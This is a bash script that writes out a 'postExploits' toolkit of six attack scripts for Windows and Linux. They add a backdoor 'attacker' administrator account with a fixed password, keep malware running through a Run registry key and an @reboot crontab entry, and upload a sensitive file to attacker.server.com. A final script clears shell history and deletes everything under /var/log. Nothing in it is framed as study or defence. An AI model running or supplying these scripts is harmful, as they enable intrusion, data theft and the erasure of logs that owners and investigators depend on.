#!/bin/bash

# Define the base directory
BASE_DIR="postExploits"

# Create the base directory if it doesn't exist
mkdir -p "$BASE_DIR"

# 1. Create and populate escalate_privileges.ps1 (Windows - PowerShell)
cat <<EOL > "$BASE_DIR/escalate_privileges.ps1"
# escalate_privileges.ps1

# Function to check if the script is running with Administrator privileges
\$adminCheck = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
\$adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
if (-not (\$adminCheck.IsInRole(\$adminRole))) {
    Write-Host "Not running with administrator privileges. Attempting to elevate..."
    Start-Process powershell -Verb runAs -ArgumentList \$myInvocation.Line
    exit
}

# Example: Attempt to add a new admin user if privileges are available
\$adminUser = "attacker"
\$password = "P@ssw0rd"
\$command = "net user \$adminUser \$password /add"
Invoke-Expression \$command
\$command2 = "net localgroup administrators \$adminUser /add"
Invoke-Expression \$command2

Write-Host "Privilege escalation successful. New user '\$adminUser' added to administrators group."
EOL

# 2. Create and populate escalate_privileges.sh (Linux - Bash)
cat <<EOL > "$BASE_DIR/escalate_privileges.sh"
#!/bin/bash

# Check if the script is running as root
if [ "\$(id -u)" -ne 0 ]; then
    echo "Not running as root. Trying to escalate privileges..."
    sudo "\$0" "\$@"
    exit 0
fi

# Example: Add a new admin user
USER="attacker"
PASSWORD="P@ssw0rd"
useradd -m \$USER
echo "\$USER:\$PASSWORD" | chpasswd
usermod -aG sudo \$USER

echo "Privilege escalation successful. New user '\$USER' added to sudoers group."
EOL

# 3. Create and populate persistence.ps1 (Windows - PowerShell)
cat <<EOL > "$BASE_DIR/persistence.ps1"
# persistence.ps1

# Create registry key to ensure malware runs on system startup
\$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
\$regName = "Malware"
\$regValue = "C:\\path\\to\\malware.exe"

New-ItemProperty -Path \$regPath -Name \$regName -Value \$regValue -Force

Write-Host "Persistence established. Malware will run at startup."
EOL

# 4. Create and populate persistence.sh (Linux - Bash)
cat <<EOL > "$BASE_DIR/persistence.sh"
#!/bin/bash

# Check if running as root
if [ "\$(id -u)" -ne 0 ]; then
    echo "Not running as root. Trying to escalate privileges..."
    sudo "\$0" "\$@"
    exit 0
fi

# Add malware to cron job for persistence (every reboot)
CRONJOB="@reboot /path/to/malware"
echo "\$CRONJOB" >> /etc/crontab

echo "Persistence established. Malware will run at startup."
EOL

# 5. Create and populate data_exfiltration.py (Python - Data Exfiltration)
cat <<EOL > "$BASE_DIR/data_exfiltration.py"
# data_exfiltration.py
import requests
import os

# Define the path of the file to exfiltrate
file_path = "/path/to/sensitive/file.txt"

# Define the remote server URL to exfiltrate data to
server_url = "http://attacker.server.com/upload"

# Open the file and prepare the data for exfiltration
with open(file_path, 'rb') as f:
    file_data = f.read()

# Send data to the server
response = requests.post(server_url, files={'file': file_data})

# Check if the exfiltration was successful
if response.status_code == 200:
    print("Data exfiltrated successfully.")
else:
    print(f"Failed to exfiltrate data. Server responded with {response.status_code}")
EOL

# 6. Create and populate cleanup.sh (Linux - Bash)
cat <<EOL > "$BASE_DIR/cleanup.sh"
#!/bin/bash

# Clear bash history
history -c
echo > ~/.bash_history

# Remove system logs
rm -rf /var/log/*

# Remove traces of the exploit
rm -rf /tmp/malware

echo "Cleanup completed. All traces removed."
EOL

# Provide confirmation that the files were created successfully
echo "All files have been created successfully in the $BASE_DIR directory."
